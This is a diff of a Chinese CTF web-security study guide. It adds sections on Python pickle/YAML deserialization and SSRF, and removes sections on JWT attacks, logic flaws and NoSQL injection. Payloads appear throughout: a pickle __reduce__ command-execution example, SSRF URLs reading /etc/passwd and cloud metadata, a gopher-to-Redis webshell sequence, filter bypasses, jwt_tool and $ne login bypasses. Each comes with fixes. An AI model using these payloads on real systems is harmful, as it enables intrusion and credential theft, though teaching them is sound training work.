+> 🎯 **本节目标**：能解释 pickle 为什么能执行代码，分清 Python 对象图与 JS 原型链的区别，知道 safe_load / RestrictedUnpickler 的边界。
+
+先纠正一个容易混的说法：**Python 没有 JS 那种原型链**，把 prototype pollution 的术语硬套到 Python 上会越学越乱。Python 的反序列化问题来自另一件事：**pickle 在还原对象时，会按照字节流里的指令重建对象、导入模块、调用可调用对象**。用户可控的字节被还原成对象图，就等于把「构造对象」的权力交给了攻击者。
+
+**最小原理：__reduce__ 决定怎么还原**
+
+```python
+import pickle, os
+
+class Evil:
+    def __reduce__(self):
+        # 反序列化时，pickle 会调用 os.system("id")
+        return (os.system, ("id",))
+
+payload = pickle.dumps(Evil())
+pickle.loads(payload)      # 还原的那一刻执行命令
+```
+
+`__reduce__` 只是最直观的入口。真实题目里，危险点可能是 `yaml.load`、`joblib.load`、Flask 的缓存、Celery 任务、机器学习模型。共同点只有一个：**不可信字节被当成了对象图**。
+
+**别把概念混在一起：JS 与 Python 对照**
+
+| 你听到的说法 | JS 里是什么 | Python 里对应什么 |
+| --- | --- | --- |
+| 原型链污染 | `__proto__` / `Object.prototype` | 没有原型链；对应对象图、MRO、子类遍历 |
+| 沙箱逃逸 | vm / prototype gadget | `__class__.__mro__.__subclasses__()`、pickle gadget |
+| 反序列化 | JSON 本身不执行；node-serialize 等库才危险 | pickle / yaml.load / joblib / torch.load |
+| 模板注入 | EJS / Pug 等模板 | Jinja2 表达式求值（SSTI，不是反序列化） |
+
+### 怎么找入口
+
+1. 全局搜 `pickle.loads`、`pickle.load`、`yaml.load`、`joblib.load`、`torch.load`。
+2. 看数据是否可控：Cookie、上传文件、缓存、队列消息、模型文件。
+3. 看有没有安全替代：`yaml.safe_load`、`RestrictedUnpickler`、HMAC 签名。
+4. 看版本与依赖：老版本库可能默认不安全，或存在已知 gadget。
+5. 确认「还原时到底调用了什么」——这才是根因，不是 payload 长什么样。
+
+**安全与不安全的写法**
+
+```python
+import yaml, pickle
+
+# ❌ 不安全：yaml.load 可以构造任意 Python 对象
+data = yaml.load(untrusted, Loader=yaml.Loader)
+
+# ✅ 安全：只解析基础类型
+data = yaml.safe_load(untrusted)
+
+# ✅ 如果必须用 pickle：白名单类 + 签名校验
+class SafeUnpickler(pickle.Unpickler):
+    def find_class(self, module, name):
+        if (module, name) not in ALLOWED:
+            raise pickle.UnpicklingError("blocked")
+        return super().find_class(module, name)
+```
+
+### 修复
+
+- 能不反序列化就不反序列化：跨边界优先用 JSON。
+- 必须用 YAML 时用 `safe_load`；必须用 pickle 时用白名单 `RestrictedUnpickler`。
+- 给序列化数据加 HMAC 签名，验证来源后再还原。
+- 不要反序列化用户上传的模型/缓存/队列消息；隔离解析进程与权限。
+- 升级依赖，排查历史上默认不安全的库。
+
+> 💡 Python 的 SSTI 也会走 `__class__.__mro__`，但那是**模板表达式求值**，不是反序列化。两者都涉及对象图，别混为一谈——这也是「按诞生地学」比「按 payload 学」更清楚的原因。
+
+
+### 靶场与资源
+
+- [Python 官方文档 · pickle](https://docs.python.org/3/library/pickle.html)
+- [HackTricks · Python 沙箱与反序列化](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/python/bypass-python-sandboxes/index.html)
+
+
+### 自测 · 答不上就回去重读
+
+1. Python 有原型链污染吗？如果没有，对应的风险是什么？
+2. pickle 在反序列化时为什么会执行代码？
+3. yaml.load 和 yaml.safe_load 的区别是什么？
+4. RestrictedUnpickler 解决的是哪一层问题？
+5. 为什么说 SSTI 和反序列化都涉及对象图，但不是一回事？
+
+---
+
+## 反序列化（Java）：readObject 与组件链
 
 *约 40 分钟*
 
@@ -4205,220 +4510,6 @@ base64 -w0 payload.bin
 3. 为什么「确定版本」比「找链」更关键？
 4. ysoserial 是做什么的？URLDNS 链有什么特别？
 5. log4shell 的触发字符串长什么样？
-
----
-
-## 认证绕过：Session / JWT / Cookie
-
-*约 35 分钟*
-
-> 🎯 **本节目标**：掌握三类「冒充身份」的常用手法，并能用工具验证。
-
-认证绕过是 CTF 里性价比最高的一类：不用拿 shell，改一个字段就能进后台。
-
-**JWT 的四类攻击**
-
-```
-1. alg 改成 none，删掉签名段
-   {"alg":"none"} . payload . （空签名）
-   -> 服务器若没显式拒绝 none，直接通过
-
-2. 弱密钥爆破
-   用 jwt_tool / hashcat，字典来自常见弱口令
-
-3. 算法混淆（RS256 -> HS256）
-   前提：服务器用公钥验证，但代码里把公钥当 HS256 的密钥用
-   -> 用公钥当 HMAC 密钥重新签名
-
-4. kid 注入
-   kid 指向可控文件（../dev/null）或直接拼进 SQL
-   -> 用空密钥 / 用已知文件内容当密钥
-```
-
-**jwt_tool 常用命令**
-
-```bash
-python3 jwt_tool.py <JWT> -M at            # 自动跑各种攻击
-python3 jwt_tool.py <JWT> -C -d wordlist.txt # 爆破 HS256 密钥
-python3 jwt_tool.py <JWT> -X a             # alg=none
-python3 jwt_tool.py <JWT> -X k -pk public.pem  # 算法混淆
-```
-
-**Session / Cookie 攻击面**
-
-| 手法 | 说明 |
-| --- | --- |
-| session id 可预测 | 时间戳、自增值、MD5(用户名) 之类 |
-| 伪造 Cookie 里的权限字段 | role=admin、is_admin=1，后端直接信任 |
-| Session Fixation | 让受害者用攻击者已知的 session id 登录 |
-| Cookie 里是序列化数据 | PHP/Java 反序列化入口 |
-| JWT 放在 localStorage | XSS 可直接读走 |
-
-### 判断顺序（按成本从低到高）
-
-1. 先看 token 结构：JWT 就 base64 解开 header/payload，看 role 之类的字段。
-2. 改 payload 里的权限字段，看签名是否被校验（不校验直接过 = 最简单）。
-3. 查 alg 是否接受 none，用 jwt_tool -X a 试。
-4. 用常见弱口令爆破 HS256 密钥。
-5. 看 kid/x5u/jku 等字段是否可控。
-6. 以上都不行，再考虑 session 伪造或反序列化。
-
-**JWT 结构（自己拆一遍）**
-
-```python
-import base64, json
-tok = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjEsInJvbGUiOiJ1c2VyIn0.xxxxx"
-h, p, s = tok.split(".")
-pad = lambda x: x + "=" * (-len(x) % 4)
-print(json.loads(base64.urlsafe_b64decode(pad(h))))
-print(json.loads(base64.urlsafe_b64decode(pad(p))))
-# 输出：{'alg': 'HS256', 'typ': 'JWT'}  {'uid': 1, 'role': 'user'}
-# 注意：payload 是"明文"，只是 base64，不是加密
-```
-
-> 💡 记住一个底层事实：**JWT 的安全性 100% 依赖签名校验**。payload 谁都能看、谁都能改。所有攻击最终都是「让服务器接受一个我没签过的 payload」。
-
-
-### 靶场与资源
-
-- [PortSwigger · JWT](https://portswigger.net/web-security/jwt)
-- [jwt_tool](https://github.com/ticarpi/jwt_tool)
-
-
-### 自测 · 答不上就回去重读
-
-1. alg=none 为什么能绕过验证？服务器该怎么防？
-2. RS256 混淆攻击的前提是什么？
-3. 为什么 session id 必须足够随机？
-4. kid 字段能怎么被利用？
-5. JWT 的 payload 是加密的吗？
-
----
-
-## 逻辑漏洞与越权
-
-*约 30 分钟*
-
-> 🎯 **本节目标**：理解「代码没写错，但业务逻辑被绕过」，建立挖逻辑漏洞的固定流程。
-
-逻辑漏洞没有「注入点」这种明确标志，它的定义是：**功能按设计跑起来了，但某个假设被攻击者破坏了**——比如「用户只会改自己的 id」「金额只能是正数」「支付必须先付款」。
-
-**常见类型**
-
-| 类型 | 具体表现 | 怎么试 |
-| --- | --- | --- |
-| 水平越权 | 改 id 看别人的订单/资料 | 把用户 id 改成相邻值 |
-| 垂直越权 | 普通用户直接调管理员接口 | 抓管理员的请求，换成普通账号重放 |
-| 价格篡改 | 改单价、数量为负、优惠券叠加 | 改请求体里的金额字段 |
-| 支付绕过 | 跳过支付步骤、改金额、重放 | 删掉中间步骤直接请求最后一步 |
-| 验证码问题 | 复用、爆破、短信轰炸、前端校验 | 同一验证码用两次；写成 0000–9999 爆破 |
-| 流程竞争 | 同一优惠券并发使用多次 | 多线程同时发请求 |
-
-### 挖逻辑漏洞的四步
-
-1. 正常走一遍完整流程，用 Burp 记下**每一个**请求（注册、登录、下单、支付、退款）。
-2. 逐个问：这一步的「前提」是服务器保证的，还是前端/上一步保证的？
-3. 改掉你觉得「不该被改」的参数：id、数量、金额、状态、时间、角色。
-4. 重复、并发、乱序地发请求——很多漏洞只在「同时发生」时出现。
-
-**一个典型的越权**
-
-```
-# 正常：GET /api/order?id=1001      （当前用户自己的订单）
-# 越权：GET /api/order?id=1002      （别人的订单，服务器没校验归属）
-
-# 修复：从 session 里取用户 id，而不是从请求里取
-# 错误：SELECT * FROM orders WHERE id = $_GET['id']
-# 正确：SELECT * FROM orders WHERE id = ? AND user_id = ?
-```
-
-**并发竞争的最小验证**
-
-```bash
-# 用同一张优惠券同时发 20 个请求，看是否都被接受
-seq 20 | xargs -P 20 -I{} curl -s -b "session=..." \
-  -X POST https://target/api/coupon/use -d "code=XXXX" -o /dev/null -w "%{http_code}\n"
-
-# 原理：后端顺序是「查是否已用 -> 用掉 -> 更新状态」
-# 并发时多个请求在「查」之后、更新之前都通过了检查
-```
-
-> 💡 逻辑漏洞无法靠字典扫，全靠对业务流程的理解。**这类题最考耐心和观察力，也最接近真实的渗透测试**——因为它是真正「读懂系统」的体现。
-
-
-### 自测 · 答不上就回去重读
-
-1. 水平越权和垂直越权的区别？
-2. 「前端隐藏了按钮」为什么不算权限控制？
-3. 并发竞争利用的是什么缺陷？
-4. 挖逻辑漏洞的第一步是什么？
-5. 越权漏洞在代码层应该怎么修？
-
----
-
-## NoSQL 注入
-
-*约 25 分钟*
-
-> 🎯 **本节目标**：理解 MongoDB 查询对象的注入方式，以及和 SQL 注入的共同点。
-
-NoSQL 数据库（MongoDB 最常见）用「对象」来描述查询条件。如果后端把用户输入直接拼进查询对象，攻击者就能构造出「匹配任意值」的条件——这和 SQL 注入同源，只是注入的载体从字符串换成了对象。
-
-**MongoDB 注入原理**
-
-```js
-// 正常查询
-db.users.find({ username: name, password: pw })
-
-// 攻击：让 password 变成「不等于 1」的查询对象
-// 请求：?username=admin&password[$ne]=1
-// 后端解析成 { username: 'admin', password: { $ne: 1 } }
-// -> 只要密码不等于 1 就匹配，等于绕过密码校验
-
-// 其他常用操作符
-?username[$regex]=^adm&password[$ne]=1
-?username[$gt]=&password[$gt]=
-```
-
-**常用操作符与含义**
-
-| 操作符 | 含义 | 注入用法 |
-| --- | --- | --- |
-| $ne | 不等于 | $ne=1 让密码校验永远为真 |
-| $gt / $lt | 大于 / 小于 | $gt= 空串匹配任何存在的值 |
-| $regex | 正则匹配 | 逐字符猜用户名/密码 |
-| $exists | 字段存在 | 探测字段 |
-| $where | JS 表达式（旧版） | 直接执行 JS，危害最大 |
-
-**后端漏洞代码与修复**
-
-```js
-// 危险：直接把 req.body 当年的查询条件
-app.post('/login', (req, res) => {
-  db.collection('users').findOne({ username: req.body.username, password: req.body.password })
-    .then(u => res.send(u ? 'ok' : 'fail'));
-});
-
-// 修复 1：强制把参数转成字符串
-const username = String(req.body.username);
-// 修复 2：用 express-mongo-sanitize 去掉 $ 开头的键
-// 修复 3：密码比对在应用层做（hash 比对），不要拼进查询条件
-```
-
-> 💡 CTF 里 NoSQL 注入的入口通常是登录框；用 `[$ne]=1` 或 `[$regex]` 试一下就知道。判据和 SQL 盲注一样：**看响应差异**。
-
-
-### 靶场与资源
-
-- [PortSwigger · NoSQL injection](https://portswigger.net/web-security/nosql-injection)
-
-
-### 自测 · 答不上就回去重读
-
-1. $ne 在 MongoDB 里是什么语义？
-2. 为什么 ?password[$ne]=1 会被解析成对象？
-3. NoSQL 注入和 SQL 注入共同的根源是什么？
-4. 怎么防御 NoSQL 注入？
 
 ---
 
@@ -4500,7 +4591,109 @@ console.log(b.isAdmin);  // true
 
 ---
 
-# PART 9 · 渗透流程与解题方法论
+## SSRF：让服务器替你访问
+
+*约 40 分钟*
+
+> 🎯 **本节目标**：理解 SSRF 的三种用途（内网探测、读文件、打内网应用），掌握常见过滤的绕过。
+
+SSRF（Server-Side Request Forgery）的本质：**服务器会去访问你给的地址，而你给了一个它本不该访问的地址。**它的价值在于「绕过防火墙」——你从外网连不进去的内网服务，服务器能连。
+
+**典型漏洞代码**
+
+```php
+<?php
+// 功能：图片加载 / URL 预览 / 远程下载
+$url = $_GET['url'];
+echo file_get_contents($url);
+
+// 正常：?url=https://example.com/a.png
+// 攻击：?url=http://127.0.0.1/admin          （访问本机管理后台）
+// 攻击：?url=file:///etc/passwd               （读本地文件）
+// 攻击：?url=http://169.254.169.254/latest/meta-data/   （云元数据）
+?>
+```
+
+**协议与用途**
+
+| 协议 | 用途 | 说明 |
+| --- | --- | --- |
+| http / https | 打内网 Web 服务 | 最常见 |
+| file:// | 读本地文件 | PHP 默认允许 |
+| dict:// | 探测端口、打 Redis/Memcached | dict://127.0.0.1:6379/info |
+| gopher:// | 构造任意 TCP 报文（打 Redis、MySQL、FastCGI） | 能发原始字节，利用面最广 |
+| ftp:// / tftp:// | 探测内网文件服务 | 有时可用 |
+
+### 判断 SSRF 是否存在
+
+1. 找一个「服务器会访问 URL」的功能：图片加载、URL 预览、webhook、远程下载、PDF 生成。
+2. 喂一个自己控制的地址（或 dnslog.cn），看服务器有没有回连——有回连就是 SSRF。
+3. 试 `http://127.0.0.1:端口` 扫内网端口：响应时间/内容不同就是服务存活。
+4. 试 `file:///etc/passwd` 读文件；试 `http://169.254.169.254/` 读云元数据。
+5. 拿到 Redis / MySQL 之类内网服务时，用 gopher 构造报文打（这一层属于进阶）。
+
+**gopher 打 Redis 的思路**
+
+```bash
+# Redis 未授权：直接写 webshell 或写 crontab
+# gopher 报文体需要把命令转成 Redis 协议（RESP）再做 URL 编码
+# 常用工具：Gopherus、SSRFmap
+
+# 简化示意：gopher://127.0.0.1:6379/_<URL编码后的RESP>
+# 关键命令序列：CONFIG SET dir /var/www/html -> CONFIG SET dbfilename 1.php -> SET x "<?php ...?>" -> SAVE
+```
+
+**常见过滤与绕过**
+
+| 过滤方式 | 绕过写法 |
+| --- | --- |
+| 过滤 127.0.0.1 | 127.1、0.0.0.0、[::1]、2130706433、0x7f000001、127.0.0.1.nip.io |
+| 过滤 localhost | 同上，或 DNS 重绑定（第一次解析公网 IP 过校验，第二次解析内网） |
+| 只允许 http:// | 302 跳转绕过：自己的服务器跳回内网地址 |
+| 校验 URL 前缀 | user@host 形式：http://expected.com@evil.com/ |
+| 校验 host 但没校验端口 | 直接换端口找内网服务 |
+| 禁 file 协议 | 用 gopher / dict 曲线读文件或打服务（取决于库） |
+
+**修复：白名单 + 解析后校验**
+
+```php
+<?php
+// 1. 只允许明确需要的协议
+$scheme = parse_url($url, PHP_URL_SCHEME);
+if (!in_array($scheme, ['http', 'https'])) die("协议不允许");
+
+// 2. 解析域名成 IP，再判断是不是内网地址
+$host = parse_url($url, PHP_URL_HOST);
+$ip = gethostbyname($host);
+if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
+    die("内网地址不允许");
+}
+
+// 3. 禁止跟随跳转（curl: CURLOPT_FOLLOWLOCATION => false）
+// 4. 出站流量走统一代理，在代理层做白名单
+?>
+```
+
+> 💡 SSRF 的修复比利用更难：因为「解析」和「连接」之间有时间差（DNS 重绑定就利用这一点）。生产上最可靠的做法是**出站白名单代理**，而不是在代码里做黑名单过滤。
+
+
+### 靶场与资源
+
+- [PortSwigger · SSRF](https://portswigger.net/web-security/ssrf)
+- [CTFHub · SSRF 专项](https://www.ctfhub.com/)
+
+
+### 自测 · 答不上就回去重读
+
+1. SSRF 为什么能绕过防火墙？
+2. 169.254.169.254 是什么地址？拿到它能干什么？
+3. DNS 重绑定怎么绕过「只允许公网 IP」的校验？
+4. 为什么说 SSRF 的修复比利用更难？
+5. 写出两种绕过 127.0.0.1 过滤的写法。
+
+---
+
+# PART 8 · 渗透流程与解题方法论
 
 *第 18–20 周 · 11 节*
 
@@ -5047,7 +5240,7 @@ env | grep -i secret        # 有没有环境变量泄露
 
 ---
 
-# PART 10 · 实战复盘
+# PART 9 · 实战复盘
 
 *第 20–22 周 · 4 节*
 
@@ -5217,7 +5410,7 @@ print(q("0 union select 1,database(),3 -- "))
 | 阶段 | 时间 | 目标 | 衡量方式 |
 | --- | --- | --- | --- |
 | 打基础 | 现在–3 个月 | 走完零基础 10 节 + PART 1–4 | 能独立起服务、改包、读 JS |
-| 能做题 | 3–9 个月 | PART 7 / 8 共十八节能独立复现 | 新手题 10 分钟内判断题型 |
+| 能做题 | 3–9 个月 | PART 7 的 18 个节点能独立复现，并说清根因 | 新手题 10 分钟内判断题型 |
 | 能比赛 | 9–18 个月 | 打完整一场比赛并复盘 | 有 WriteUp、有 payload 库、有稳定节奏 |
 
 - **固定刷题节奏**：每周 2–3 道，重点在复盘而不是数量。
